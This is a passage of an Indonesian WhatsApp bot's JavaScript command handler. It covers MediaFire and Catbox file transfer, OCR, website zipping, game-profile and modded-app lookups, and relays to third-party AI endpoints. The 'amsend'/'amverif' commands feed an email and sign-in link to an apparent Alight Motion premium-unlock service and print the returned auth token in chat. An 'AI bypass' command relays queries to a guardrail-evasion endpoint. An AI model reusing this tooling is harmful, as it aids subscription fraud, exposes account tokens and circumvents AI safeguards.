            `━━━━━━━━━━━━━━━━━━\n` +
            `Luna-MD`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "GROUPSOR ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mencari grup.\n" +
            "API mungkin sedang error atau timeout."
        )
    }
}
break

case "mfdl":
case "mediafire": {
    const fs = require("fs")
    const path = require("path")
    const cheerio = require("cheerio")

    let filePath = null

    try {
        const mediafireUrl = text?.trim()

        if (!mediafireUrl) {
            return m.reply(
                example("https://www.mediafire.com/file/xxxxx/file")
            )
        }

        if (!/^https?:\/\/(www\.)?mediafire\.com\//i.test(mediafireUrl)) {
            return m.reply(
                "❌ URL MediaFire tidak valid."
            )
        }

        await m.reply(
            "⏳ *MEDIAFIRE DOWNLOADER*\n\n" +
            "🔎 Mencari link download..."
        )

        const session = axios.create({
            headers: {
                "User-Agent":
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/120.0.0.0 Safari/537.36",
                "Accept":
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            timeout: 30000,
            maxRedirects: 10
        })

        const response = await session.get(mediafireUrl)
        const $ = cheerio.load(response.data)

        let downloadUrl = null

        
        downloadUrl = $("#downloadButton").attr("href") || null

        
        if (!downloadUrl) {
            downloadUrl =
                $("a.download_link").attr("href") || null
        }

        
        if (!downloadUrl) {
            const links = $('a[href*="download"]')

            if (links.length > 0) {
                downloadUrl =
                    links.first().attr("href") || null
            }
        }

        
        if (!downloadUrl) {
            const match = response.data.match(
                /href="(https:\/\/download\d+\.mediafire\.com\/[^"]+)"/
            )

            if (match) {
                downloadUrl = match[1]
            }
        }

        if (!downloadUrl) {
            return m.reply(
                "❌ Direct download MediaFire tidak ditemukan."
            )
        }

        
        if (downloadUrl.startsWith("/")) {
            downloadUrl =
                new URL(
                    downloadUrl,
                    mediafireUrl
                ).href
        }

        await m.reply(
            "📥 Link download ditemukan.\n" +
            "⬇️ Sedang mengunduh file..."
        )

        
        const outputDir = path.join(
            process.cwd(),
            "downloads"
        )

        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, {
                recursive: true
            })
        }

        
        let filename = null

        try {
            const urlObj = new URL(downloadUrl)
            filename = path.basename(
                decodeURIComponent(urlObj.pathname)
            )
        } catch (e) {}

        
        if (!filename || filename === "/" || filename === ".") {
            filename =
                $("div.filename").first().text().trim() ||
                $("meta[property='og:title']")
                    .attr("content") ||
                "mediafire_file"
        }

        
        filename = filename
            .replace(/[<>:"/\\|?*\x00-\x1F]/g, "_")
            .trim()

        if (!filename) {
            filename = "mediafire_file"
        }

        filePath = path.join(
            outputDir,
            `${Date.now()}_${filename}`
        )

        
        const fileResponse = await session.get(
            downloadUrl,
            {
                responseType: "arraybuffer",
                timeout: 300000,
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            }
        )

        fs.writeFileSync(
            filePath,
            Buffer.from(fileResponse.data)
        )

        const stats = fs.statSync(filePath)

        if (!stats.size) {
            throw new Error(
                "File hasil download kosong."
            )
        }

        const sizeMB =
            (stats.size / 1024 / 1024).toFixed(2)

        await m.reply(
            `✅ *DOWNLOAD BERHASIL*\n\n` +
            `📁 File: *${filename}*\n` +
            `📦 Size: *${sizeMB} MB*\n\n` +
            `📤 Mengirim file...`
        )

        
        const ext = path
            .extname(filename)
            .toLowerCase()

        const mimeMap = {
            ".zip": "application/zip",
            ".rar": "application/vnd.rar",
            ".7z": "application/x-7z-compressed",
            ".pdf": "application/pdf",
            ".txt": "text/plain",
            ".json": "application/json",
            ".js": "text/javascript",
            ".html": "text/html",
            ".css": "text/css",
            ".apk": "application/vnd.android.package-archive",
            ".mp3": "audio/mpeg",
            ".mp4": "video/mp4",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
            ".webp": "image/webp",
            ".gif": "image/gif"
        }

        const mimetype =
            mimeMap[ext] ||
            "application/octet-stream"

        
        await luna.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(filePath),
                mimetype: mimetype,
                fileName: filename,
                caption:
                    `📁 *${filename}*\n` +
                    `📦 ${sizeMB} MB\n` +
                    `🔗 Source: MediaFire`
            },
            {
                quoted: m
            }
        )

    } catch (err) {
        console.error(
            "MEDIAFIRE ERROR:",
            err?.response?.data || err
        )

        await m.reply(
            "❌ *MEDIAFIRE DOWNLOAD GAGAL*\n\n" +
            `${err?.message || "Terjadi kesalahan saat download."}`
        )

    } finally {
        
        try {
            if (
                filePath &&
                fs.existsSync(filePath)
            ) {
                fs.unlinkSync(filePath)
            }
        } catch (e) {
            console.error(
                "Gagal menghapus temporary file:",
                e
            )
        }
    }
}
break

case "catbox": {
    const fs = require("fs")
    const path = require("path")
    const FormData = require("form-data")

    const BASE = "https://catbox.moe"
    const JS_URL = `${BASE}/resources/uploadform.js`

    const UA =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/126.0.0.0 Safari/537.36"

    const MIME = {
        ".png": "image/png",
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".gif": "image/gif",
        ".webp": "image/webp",
        ".txt": "text/plain",
        ".pdf": "application/pdf",
        ".mp4": "video/mp4",
        ".zip": "application/zip",
        ".rar": "application/vnd.rar",
        ".7z": "application/x-7z-compressed",
        ".mp3": "audio/mpeg",
        ".m4a": "audio/mp4",
        ".wav": "audio/wav"
    }

    const timeoutSignal = (ms = 600000) => {
        const controller = new AbortController()

        const timer = setTimeout(() => {
            controller.abort()
        }, ms)

        timer.unref?.()

        return controller.signal
    }

    const scrapeForm = async () => {
        const res = await fetch(BASE, {
            headers: {
                "User-Agent": UA
            },
            signal: timeoutSignal(30000)
        })

        if (!res.ok) {
            throw new Error(
                `Gagal membuka Catbox: HTTP ${res.status}`
            )
        }

        const html = await res.text()

        const match =
            html.match(
                /<form[^>]*class="dropzone"[^>]*>[\s\S]*?<\/form>/i
            ) ||
            html.match(
                /<form[^>]*id="dropzoneUpload"[^>]*>[\s\S]*?<\/form>/i
            )

        if (!match) {
            throw new Error(
                "Form upload Catbox tidak ditemukan."
            )
        }

        const formHtml = match[0]

        const actionMatch =
            formHtml.match(/action="([^"]+)"/i)

        if (!actionMatch) {
            throw new Error(
                "Action upload Catbox tidak ditemukan."
            )
        }

        const action =
            BASE +
            "/" +
            actionMatch[1].replace(/^\//, "")

        const fields = {}

        for (
            const tag of
            formHtml.match(/<input[^>]*>/gi) || []
        ) {
            const type =
                tag.match(/\btype="([^"]*)"/i)?.[1]

            const name =
                tag.match(/\bname="([^"]*)"/i)?.[1]

            const value =
                tag.match(/\bvalue="([^"]*)"/i)?.[1]

            if (
                type?.toLowerCase() === "hidden" &&
                name
            ) {
                fields[name] = value || ""
            }
        }

        return {
            action,
            fields
        }
    }

    const scrapeJsParam = async () => {
        const res = await fetch(JS_URL, {
            headers: {
                "User-Agent": UA
            },
            signal: timeoutSignal(30000)
        })

        if (!res.ok) {
            throw new Error(
                `Gagal mengambil uploadform.js: HTTP ${res.status}`
            )
        }

        const js = await res.text()

        const match =
            js.match(/paramName\s*:\s*"([^"]+)"/)

        if (!match) {
            throw new Error(
                "paramName upload Catbox tidak ditemukan."
            )
        }

        return match[1]
    }

    const uploadFile = async (
        filePath,
        form,
        fileField
    ) => {
        const fd = new FormData()

        for (
            const [key, value]
            of Object.entries(form.fields)
        ) {
            fd.append(key, value)
        }

        const ext =
            path
                .extname(filePath)
                .toLowerCase()

        fd.append(
            fileField,
            fs.createReadStream(filePath),
            {
                filename:
                    path.basename(filePath),

                contentType:
                    MIME[ext] ||
                    "application/octet-stream"
            }
        )

        

        const axios = require("axios")

        const res = await axios.post(
            form.action,
            fd,
            {
                headers: {
                    ...fd.getHeaders(),
                    "User-Agent": UA,
                    "Referer": `${BASE}/`,
                    "Origin": BASE,
                    "X-Requested-With":
                        "XMLHttpRequest"
                },

                maxBodyLength: Infinity,
                maxContentLength: Infinity,

                timeout: 600000,

                validateStatus: () => true
            }
        )

        const body =
            String(res.data || "").trim()

        if (
            res.status === 200 &&
            /^https?:\/\/(i|litterbox)\.catbox\.moe\//i.test(body)
        ) {
            return body
        }

        if (
            res.status === 412 &&
            /invalid uploader/i.test(body)
        ) {
            throw new Error(
                "Catbox menolak IP server ini (412 Invalid uploader)."
            )
        }

        throw new Error(
            `Catbox gagal (HTTP ${res.status}): ${body.slice(0, 300)}`
        )
    }

    const uploadViaUrl = async (
        url,
        form
    ) => {
        const axios = require("axios")

        const fd = new FormData()

        fd.append(
            "reqtype",
            "urlupload"
        )

        fd.append(
            "userhash",
            form.fields.userhash || ""
        )

        fd.append(
            "url",
            url
        )

        const res = await axios.post(
            form.action,
            fd,
            {
                headers: {
                    ...fd.getHeaders(),
                    "User-Agent": UA,
                    "Referer": `${BASE}/`
                },

                timeout: 600000,

                validateStatus: () => true
            }
        )

        const body =
            String(res.data || "").trim()

        if (
            res.status === 200 &&
            body.startsWith("http")
        ) {
            return body
        }

        if (
            res.status === 412 &&
            /invalid uploader/i.test(body)
        ) {
            throw new Error(
                "Catbox menolak IP server ini (412 Invalid uploader)."
            )
        }

        throw new Error(
            `Upload URL gagal (HTTP ${res.status}): ${body.slice(0, 300)}`
        )
    }

    let media = null

    try {
        const input =
            text?.trim()

        

        if (
            input &&
            /^https?:\/\//i.test(input)
        ) {
            await m.reply(
                "⏳ Mengupload URL ke Catbox..."
            )

            const form =
                await scrapeForm()

            const result =
                await uploadViaUrl(
                    input,
                    form
                )

            return m.reply(
                "✅ *CATBOX UPLOAD BERHASIL*\n\n" +
                `🔗 ${result}`
            )
        }

        

        const qmsg =
            m.quoted || m

        const mime =
            qmsg?.mime || ""

        if (!mime) {
            return m.reply(
                example(
                    "reply foto/video/file atau masukkan URL"
                )
            )
        }

        await m.reply(
            "⏳ Mengupload media ke Catbox..."
        )

        media =
            await luna.downloadAndSaveMediaMessage(
                qmsg
            )

        if (
            !media ||
            !fs.existsSync(media)
        ) {
            throw new Error(
                "File media gagal didownload."
            )
        }

        const form =
            await scrapeForm()

        const fileField =
            await scrapeJsParam()

        const result =
            await uploadFile(
                media,
                form,
                fileField
            )

        await m.reply(
            "✅ *CATBOX UPLOAD BERHASIL*\n\n" +
            `🔗 ${result}`
        )

    } catch (err) {
        console.error(
            "CATBOX ERROR:",
            err?.response?.data ||
            err?.message ||
            err
        )

        await m.reply(
            "❌ *CATBOX UPLOAD GAGAL*\n\n" +
            `${err?.message || "Terjadi kesalahan."}`
        )

    } finally {
        try {
            if (
                media &&
                fs.existsSync(media)
            ) {
                fs.unlinkSync(media)
            }
        } catch (e) {
            console.error(
                "Gagal menghapus file temporary:",
                e
            )
        }
    }
}
break

case "amsend2": {
    try {
        const email = text?.trim()

        if (!email) {
            return m.reply(
                example("user@gmail.com")
            )
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return m.reply(
                "❌ Format email tidak valid.\n\n" +
                example("user@gmail.com")
            )
        }

        await m.reply(
            "📨 Sedang mengirim verification link ke email...\n" +
            "⏳ Mohon tunggu..."
        )

        const response = await axios.get(
            "https://v2.api-varhad.my.id/tools/amprem/verif/email",
            {
                params: {
                    email: email
                },
                headers: {
                    "Accept": "application/json"
                },
                timeout: 60000
            }
        )

        const data = response.data

        console.log(
            "AMSEND V2 RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result?.success) {
            return m.reply(
                "❌ Gagal mengirim verification link.\n" +
                `Pesan: ${data?.result?.message || "API tidak memberikan response valid."}`
            )
        }

        await m.reply(
            "✅ *AM SEND V2 BERHASIL*\n" +
            "━━━━━━━━━━━━━━━━━━\n" +
            `📧 Email: ${email}\n` +
            `📩 Status: ${data.result.message || "Link dikirim."}\n\n` +
            `_Cek inbox/spam email target, lalu ambil link verifikasinya dan jalankan:_\n` +
            example(`${prefix}amverif2 ${email}|https://alight-creative.firebaseapp.com/__/auth/links?link=...`)
        )

    } catch (err) {
        console.error(
            "AMSEND V2 ERROR:",
            err?.response?.data || err
        )

        const errorData =
            err?.response?.data

        return m.reply(
            "❌ Gagal mengirim verification link.\n\n" +
            (
                errorData
                    ? JSON.stringify(errorData, null, 2)
                    : err.message
            )
        )
    }
}
break

case "amverif": {
    try {
        const input = text?.trim()

        if (!input) {
            return m.reply(
                example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx")
            )
        }

        const separator = input.indexOf("|")

        if (separator === -1) {
            return m.reply(
                "❌ Format salah.\n\n" +
                "Gunakan pemisah `|` antara email dan link:\n" +
                example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx")
            )
        }

        const email = input
            .slice(0, separator)
            .trim()

        const link = input
            .slice(separator + 1)
            .trim()

        if (!email) {
            return m.reply(
                "❌ Email tidak boleh kosong."
            )
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return m.reply(
                "❌ Format email tidak valid."
            )
        }

        if (!/^https?:\/\//i.test(link)) {
            return m.reply(
                "❌ Link verifikasi tidak valid.\n" +
                "Link harus diawali http:// atau https://"
            )
        }

        await m.reply(
            "🔐 Sedang melakukan verifikasi AM Premium...\n" +
            "⏳ Mohon tunggu..."
        )

        const response = await axios.get(
            "https://v2.api-varhad.my.id/tools/amprem/verif/link",
            {
                params: {
                    email: email,
                    link: link
                },
                headers: {
                    "Accept": "application/json"
                },
                timeout: 120000
            }
        )

        const data = response.data

        console.log(
            "AM VERIF V2 RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result?.success) {
            return m.reply(
                "❌ Verifikasi gagal.\n" +
                `Pesan: ${data?.result?.message || "API tidak memberikan response valid."}`
            )
        }

        
        const result = data.result
        let hasil = ""

        if (result.user || result.idToken || result.premium) {
            const user = result.user || {}
            const premium = result.premium?.data?.result || {}

            hasil =
                "🔐 *AM VERIF V2 BERHASIL*\n" +
                "━━━━━━━━━━━━━━━━━━\n" +
                `👤 Nama     : ${user.displayName || "-"}\n` +
                `📧 Email    : ${user.email || email}\n` +
                `✔️ Verified : ${user.emailVerified ? "Ya" : "Tidak"}\n` +
                `👑 Premium  : ${premium.valid ? "Aktif ✅" : "Tidak Aktif ❌"}\n` +
                `🔁 AutoRenew: ${premium.autoRenewing ? "Ya" : "Tidak"}\n` +
                `📅 Expired  : ${premium.expiryTimeMillis ? new Date(Number(premium.expiryTimeMillis)).toLocaleString("id-ID") : "-"}\n\n` +
                (result.idToken
                    ? `🔑 *ID Token:*\n${result.idToken}\n\n`
                    : "") +
                "━━━━━━━━━━━━━━━━━━\n" +
                `👤 Author: ${global.botname}`
        } else {
            hasil =
                "🔐 *AM VERIF V2 BERHASIL*\n" +
                "━━━━━━━━━━━━━━━━━━\n" +
                `📧 Email: ${email}\n` +
                `📩 Status: ${result.message || "Berhasil."}\n` +
                "━━━━━━━━━━━━━━━━━━\n" +
                `👤 Author: ${global.botname}`
        }

        await m.reply(hasil)

    } catch (err) {
        console.error(
            "AM VERIF V2 ERROR:",
            err?.response?.data || err
        )

        const errorData =
            err?.response?.data

        return m.reply(
            "❌ Verifikasi gagal.\n\n" +
            (
                errorData
                    ? JSON.stringify(errorData, null, 2)
                    : err.message
            )
        )
    }
}
break

case "amsend": {
    try {
        const email = text?.trim()

        if (!email) {
            return m.reply(
                example("user@gmail.com")
            )
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return m.reply(
                "❌ Format email tidak valid.\n\n" +
                example("user@gmail.com")
            )
        }

        await m.reply(
            "🔐 *AM PREMIUM V2*\n\n" +
            "📨 Step 1: Mengirim verification link...\n" +
            "⏳ Mohon tunggu..."
        )

        const sendRes = await axios.get(
            "https://v2.api-varhad.my.id/tools/amprem/verif/email",
            {
                params: { email: email },
                headers: { "Accept": "application/json" },
                timeout: 60000
            }
        )

        const sendData = sendRes.data

        console.log(
            "AMPREM V2 SEND:",
            JSON.stringify(sendData, null, 2)
        )

        if (!sendData?.status || !sendData?.result?.success) {
            return m.reply(
                "❌ Gagal mengirim verification link.\n" +
                `Pesan: ${sendData?.result?.message || "Unknown error"}`
            )
        }

        await m.reply(
            "✅ Link berhasil dikirim ke email.\n\n" +
            "⚠️ *Langkah selanjutnya:*\n" +
            "1. Buka email target (inbox/spam)\n" +
            "2. Klik link verifikasi dari Alight Motion\n" +
            "3. Copy URL di address bar setelah redirect\n" +
            "4. Jalankan perintah:\n" +
            example(`${prefix}amverif2 ${email}|LINK_YANG_SUDAH_DICOPY`)
        )

    } catch (err) {
        console.error(
            "AMPREM V2 ERROR:",
            err?.response?.data || err
        )

        const errorData =
            err?.response?.data

        return m.reply(
            "❌ Terjadi kesalahan.\n\n" +
            (
                errorData
                    ? JSON.stringify(errorData, null, 2)
                    : err.message
            )
        )
    }
}
break

case "ocr": {
    const fs = require("fs")
    const { ImageUploadService } = require("node-upload-images")

    let media

    try {
        const qmsg = m.quoted ? m.quoted : m
        const mime = qmsg?.mime || ""

        if (!/image\/(jpe?g|png|webp)/i.test(mime)) {
            return m.reply(
                example("dengan reply foto")
            )
        }

        await m.reply("⏳ Sedang membaca teks dari foto...")

        
        media = await luna.downloadAndSaveMediaMessage(qmsg)

        if (!media || !fs.existsSync(media)) {
            return m.reply("❌ Gagal mengambil foto.")
        }

        
        const service = new ImageUploadService("pixhost.to")

        const upload = await service.uploadFromBinary(
            fs.readFileSync(media),
            "luna-md.png"
        )

        const imageUrl = upload?.directLink?.toString()

        if (!imageUrl) {
            return m.reply(
                "❌ Gagal mendapatkan URL Pixhost."
            )
        }

        console.log("OCR PIXHOST URL:", imageUrl)

        
        const apiUrl =
            "https://api.nexray.eu.cc/tools/ocr?url=" +
            encodeURIComponent(imageUrl)

        const response = await axios.get(apiUrl, {
            timeout: 120000
        })

        const data = response.data

        console.log(
            "OCR RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ API OCR tidak memberikan hasil."
            )
        }

        const result = data.result
        const hasilText = result.text?.trim()

        if (!hasilText) {
            return m.reply(
                "❌ Tidak ada teks yang berhasil ditemukan di foto."
            )
        }

        await m.reply(
            `🔎 *OCR IMAGE*\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `${hasilText}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📷 *Source:* Pixhost\n`
        )

    } catch (err) {
        console.error(
            "OCR ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ OCR gagal diproses.\n\n" +
            "Kemungkinan penyebab:\n" +
            "• Upload Pixhost gagal\n" +
            "• Foto tidak dapat dibaca\n" +
            "• API OCR sedang bermasalah\n" +
            "• Request timeout"
        )

    } finally {
        
        try {
            if (media && fs.existsSync(media)) {
                fs.unlinkSync(media)
            }
        } catch (e) {
            console.error("Gagal menghapus file temporary:", e)
        }
    }
}
break

case "webtozip": {
    try {
        const url = text?.trim()

        if (!url) {
            return m.reply(
                example("https://www.rafaofficial.my.id/index.html")
            )
        }

        if (!/^https?:\/\//i.test(url)) {
            return m.reply(
                "❌ URL tidak valid.\nGunakan URL yang diawali http:// atau https://"
            )
        }

        await m.reply("⏳ Sedang mengubah website menjadi ZIP...")

        const apiUrl =
            "https://api.nexray.eu.cc/tools/webtozip?url=" +
            encodeURIComponent(url)

        const response = await axios.get(apiUrl, {
            timeout: 180000
        })

        const data = response.data

        console.log(
            "WEBTOZIP RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ Gagal membuat ZIP dari website."
            )
        }

        const result = data.result

        if (result.error?.code !== "-" || !result.downloadUrl) {
            return m.reply(
                "❌ Website gagal diproses.\n" +
                `Error: ${result.error?.text || "Tidak diketahui"}`
            )
        }

        const teks =
            `✅ *WEBSITE BERHASIL DI-ZIP*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🌐 URL: ${result.url || url}\n` +
            `📁 File disalin: *${result.copiedFilesAmount ?? 0}*\n` +
            `📦 Download ZIP:\n${result.downloadUrl}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🤖 Source: Luna-MD`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "WEBTOZIP ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mengubah website menjadi ZIP.\n" +
            "Website mungkin tidak dapat diakses atau proses API timeout."
        )
    }
}
break

case "bypass": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("hallo")
            )
        }

        await m.reply("🤖 Sedang memproses...")

        const apiUrl =
            "https://api.nexray.eu.cc/ai/bypass?text=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 120000
        })

        const data = response.data

        console.log(
            "BYPASS RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ AI Bypass tidak memberikan jawaban."
            )
        }

        await m.reply(
            "🤖 *AI BYPASS*\n\n" +
            data.result
        )

    } catch (err) {
        console.error(
            "BYPASS ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal menghubungi AI Bypass.\n" +
            "Coba lagi beberapa saat."
        )
    }
}
break

case "claude": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("halo apa kabar")
            )
        }

        await m.reply("🤖 Claude sedang berpikir...")

        const apiUrl =
            "https://api.nexray.eu.cc/ai/claude?text=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 120000
        })

        const data = response.data

        console.log(
            "CLAUDE RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ Claude tidak memberikan jawaban."
            )
        }

        await m.reply(
            "🤖 *CLAUDE AI*\n\n" +
            data.result
        )

    } catch (err) {
        console.error(
            "CLAUDE ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal menghubungi Claude AI.\n" +
            "Coba lagi beberapa saat."
        )
    }
}
break

case "ff": {
    try {
        const uid = text?.trim()

        if (!uid) {
            return m.reply(
                example("123456789")
            )
        }

        if (!/^\d+$/.test(uid)) {
            return m.reply(
                "❌ UID Free Fire hanya boleh berisi angka."
            )
        }

        await m.reply("🔎 Sedang mengambil data akun Free Fire...")

        const apiUrl =
            "https://api.nexray.eu.cc/stalker/freefire?uid=" +
            encodeURIComponent(uid)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "FREEFIRE RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ Data akun Free Fire tidak ditemukan."
            )
        }

        const ff = data.result

        let teks =
            `🎮 *FREE FIRE STALKER*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🆔 UID: *${ff.uid || uid}*\n` +
            `👤 Name: *${ff.name || "-"}*\n` +
            `⭐ Level: *${ff.level ?? "-"}*\n` +
            `✨ EXP: *${ff.exp ?? "-"}*\n` +
            `🌍 Region: *${ff.region || "-"}*\n` +
            `❤️ Likes: *${ff.likes || "0"}*\n` +
            `🏆 Prime Level: *${ff.prime_level ?? "-"}*\n` +
            `👑 Honor Score: *${ff.honor_score ?? "-"}*\n` +
            `🎖️ Title: *${ff.title ?? "-"}*\n` +
            `✍️ Signature: *${ff.signature ?? "-"}*\n` +
            `🔥 Fire Pass: *${ff.fire_pass ?? "-"}*\n` +
            `🎯 BP Badges: *${ff.bp_badges ?? "-"}*\n` +
            `🏅 BR Rank: *${ff.br_rank ?? "-"}*\n` +
            `🎮 CS Points: *${ff.cs_points ?? "-"}*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 Author: ${global.botname}`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "FREEFIRE ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mengambil data Free Fire.\n" +
            "Pastikan UID benar atau API sedang tidak bermasalah."
        )
    }
}
break

case "wikipedia": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("javascript")
            )
        }

        await m.reply("🔎 Sedang mencari di Wikipedia...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/wikipedia?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "WIKIPEDIA RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !Array.isArray(data?.result)) {
            return m.reply(
                "❌ API Wikipedia tidak memberikan hasil yang valid."
            )
        }

        const results = data.result

        if (results.length === 0) {
            return m.reply(
                `❌ Tidak ditemukan hasil Wikipedia untuk: *${query}*`
            )
        }

        let teks =
            `🔎 *WIKIPEDIA SEARCH*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔍 Query: *${query}*\n` +
            `📊 Ditemukan: *${results.length}*\n\n`

        results.slice(0, 10).forEach((item, index) => {
            
            const snippet = String(item.snippet || "Tidak ada ringkasan")
                .replace(/<[^>]*>/g, "")
                .replace(/&quot;/g, '"')
                .replace(/&#39;/g, "'")
                .replace(/&amp;/g, "&")
                .replace(/&lt;/g, "<")
                .replace(/&gt;/g, ">")

            teks +=
                `*${index + 1}. ${item.title || "Tanpa Judul"}*\n` +
                `🆔 Page ID: ${item.pageid ?? "-"}\n` +
                `📦 Size: ${item.size ?? "-"}\n` +
                `📝 Words: ${item.wordcount ?? "-"}\n` +
                `📖 ${snippet}\n` +
                `🕒 ${item.timestamp || "-"}\n\n`
        })

        teks +=
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 Author: ${global.botname}`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "WIKIPEDIA ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mencari Wikipedia.\n" +
            "API mungkin sedang error atau timeout."
        )
    }
}
break

case "groupsor": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("cari teman")
            )
        }

        await m.reply("🔎 Sedang mencari grup...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/groupsor?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "GROUPSOR RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !Array.isArray(data?.result)) {
            return m.reply(
                "❌ API tidak memberikan hasil yang valid."
            )
        }

        const results = data.result

        if (results.length === 0) {
            return m.reply(
                `❌ Tidak ditemukan grup untuk: *${query}*`
            )
        }

        let teks =
            `🔎 *SEARCH GROUP*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔍 Query: *${query}*\n` +
            `📊 Ditemukan: *${results.length}*\n\n`

        results.slice(0, 10).forEach((group, index) => {
            teks +=
                `*${index + 1}. ${group.name || "Tanpa Nama"}*\n` +
                `📝 ${group.description || "Tidak ada deskripsi"}\n` +
                `📂 Kategori: ${group.category || "-"}\n` +
                `🌍 Negara: ${group.country || "-"}\n` +
                `🔗 ${group.url || "-"}\n\n`
        })

        teks +=
            `━━━━━━━━━━━━━━━━━━\n` +
            `Luna-MD`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "GROUPSOR ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mencari grup.\n" +
            "API mungkin sedang error atau timeout."
        )
    }
}
break

case "happymood": {
    try {
        const query = text?.trim()

        if (!query) {
            return m.reply(
                example("dana")
            )
        }

        await m.reply("🔎 Sedang mencari aplikasi...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/happymood?q=" +
            encodeURIComponent(query)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "HAPPYMOOD RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !Array.isArray(data?.result)) {
            return m.reply(
                "❌ API tidak memberikan hasil yang valid."
            )
        }

        const results = data.result

        if (results.length === 0) {
            return m.reply(
                `❌ Tidak ditemukan aplikasi untuk: *${query}*`
            )
        }

        let teks =
            `🔎 *HAPPYMOOD SEARCH*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔍 Query: *${query}*\n` +
            `📊 Ditemukan: *${results.length}*\n\n`

        results.slice(0, 10).forEach((app, index) => {
            teks +=
                `*${index + 1}. ${app.title || "Unknown"}*\n` +
                `📱 Versi: ${app.version || "-"}\n` +
                `📦 Ukuran: ${app.size || "-"}\n` +
                `🛠️ Mod: ${app.mod_status || "Tidak ada"}\n` +
                `🔗 URL: ${app.url || "-"}\n\n`
        })

        teks +=
            `━━━━━━━━━━━━━━━━━━\n` +
            `Luna-MD`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "HAPPYMOOD ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mencari aplikasi.\n" +
            "API mungkin sedang error atau timeout."
        )
    }
}
break

case "pap": {
    try {
        await m.reply("⏳ Mengambil foto random...")

        const response = await axios.get(
            "https://api.nexadev.my.id/api/random/pap",
            {
                responseType: "arraybuffer",
                timeout: 60000
            }
        )

        const contentType = response.headers["content-type"] || ""

        if (!contentType.includes("image")) {
            return m.reply("❌ API tidak mengembalikan gambar.")
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption: "📸 Random PAP"
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("PAP ERROR:", err)
        m.reply("❌ Gagal mengambil random PAP.")
    }
}
break

case "anime": {
    try {
        await m.reply("⏳ Mengambil gambar anime random...")

        const response = await axios.get(
            "https://api.nexadev.my.id/api/random/anime",
            {
                responseType: "arraybuffer",
